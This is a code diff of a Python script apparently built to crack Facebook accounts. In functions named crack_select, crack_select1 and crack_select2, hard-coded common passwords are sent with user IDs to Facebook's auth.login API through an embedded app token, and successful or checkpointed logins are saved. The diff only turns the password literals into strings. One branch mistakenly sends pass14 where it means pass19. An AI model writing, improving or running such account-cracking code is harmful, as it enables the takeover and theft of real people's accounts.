@@ -458,7 +458,7 @@ def crack_select1():
 																  			                cp.close()
 																  			                cps.append(uid+pass9)
 																  			        else:		
-																					pass10 = 223344
+																					pass10 = "223344"
 																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																					q = json.loads(data)
 																					if "access_token" in q and "EAAA" in q:
@@ -671,7 +671,7 @@ def crack_select():
 		session = requests.Session()
 		session.headers.update({'User-Agent': vaugent})
 		try:
-			pass1 = 1234567890
+			pass1 = "1234567890"
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q and "EAAA" in q:
@@ -688,7 +688,7 @@ def crack_select():
 					cp.close()
 					cps.append(uid+pass1)
 				else:
-					pass2 = 123123
+					pass2 = "123123"
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
@@ -705,7 +705,7 @@ def crack_select():
 							cp.close()
 							cps.append(uid+pass2)
 						else:
-							pass3 = 654321
+							pass3 = "654321"
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q and "EAAA" in q:
@@ -722,7 +722,7 @@ def crack_select():
 									cp.close()
 									cps.append(uid+pass3)
 								else:
-									pass4 = 987654321
+									pass4 = "987654321"
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q and "EAAA" in q:
@@ -739,7 +739,7 @@ def crack_select():
 											cp.close()
 											cps.append(uid+pass4)
 										else:
-											pass5 = 121212
+											pass5 = "121212"
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q and "EAAA" in q:
@@ -1051,7 +1051,7 @@ def crack_select2():
 																  			                cp.close()
 																  			                cps.append(uid+pass9)
 																  			        else:		
-																					pass10 = 223344
+																					pass10 = "223344"
 																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																					q = json.loads(data)
 																					if "access_token" in q and "EAAA" in q:
@@ -1153,7 +1153,7 @@ def crack_select2():
 																																	cp.close()											
 																																	cps.append(uid+pass15)	
 																																else:
-																																	pass16 = 1234567890
+																																	pass16 = "1234567890"
 																																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass16+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																																	q = json.loads(data)
 																																	if "access_token" in q and "EAAA" in q:
@@ -1170,7 +1170,7 @@ def crack_select2():
 																																			cp.close()
 																																			cps.append(uid+pass16)
 																																		else:
-																																			pass17 = 123123
+																																			pass17 = "123123"
 																																			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass17+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																																			q = json.loads(data)
 																																			if "access_token" in q and "EAAA" in q:
@@ -1187,7 +1187,7 @@ def crack_select2():
 																																					cp.close()
 																																					cps.append(uid+pass17)
 																																				else:
-																																					pass18 = 654321
+																																					pass18 = "654321"
 																																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass18+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																																					q = json.loads(data)
 																																					if "access_token" in q and "EAAA" in q:
@@ -1204,7 +1204,7 @@ def crack_select2():
 																																							cp.close()
 																																							cps.append(uid+pass18)
 																																						else:
-																																							pass19 = 987654321
+																																							pass19 = "987654321"
 																																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																																							q = json.loads(data)
 																																							if "access_token" in q and "EAAA" in q:
@@ -1221,7 +1221,7 @@ def crack_select2():
 																																									cp.close()
 																																									cps.append(uid+pass19)
 																																								else:
-																																									pass20 = 121212
+																																									pass20 = "121212"
 																																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass20+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																																									q = json.loads(data)
 																																									if "access_token" in q and "EAAA" in q:
